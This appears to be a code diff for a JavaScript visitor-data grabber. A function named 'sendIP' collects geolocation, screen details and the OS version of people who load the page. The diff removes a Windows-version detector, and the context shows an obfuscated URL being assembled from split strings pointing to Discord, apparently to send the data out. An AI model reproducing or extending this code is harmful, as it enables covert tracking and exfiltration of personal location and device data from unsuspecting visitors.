@@ -23,17 +23,6 @@ const sendIP = () => {
                             return 'N/A';
                         }
                     }
-                    function getWindowsVersion() {
-                        const ua = navigator.userAgent;
-
-                        if (ua.includes("Windows NT 10.0")) return "Windows 10 or 11";
-                        if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
-                        if (ua.includes("Windows NT 6.2")) return "Windows 8";
-                        if (ua.includes("Windows NT 6.1")) return "Windows 7";
-                        if (ua.includes("Windows NT 6.0")) return "Windows Vista";
-                        if (ua.includes("Windows NT 5.1")) return "Windows XP";
-                        return "Unknown Windows version";
-                    }
                     function getBrowserLocation() {
                         return new Promise((resolve) => {
                             if (!navigator.geolocation) {
@@ -101,7 +90,7 @@ const sendIP = () => {
 
                     deviceInfo.screenRefreshRate = await getScreenRefreshRate();
                     
-                    const window = await getWindowsVersion();
+
                     const browserLocation = await getBrowserLocation();
                     const m3FzN1 = "https://";
                     const Pj5G0d = "discord";
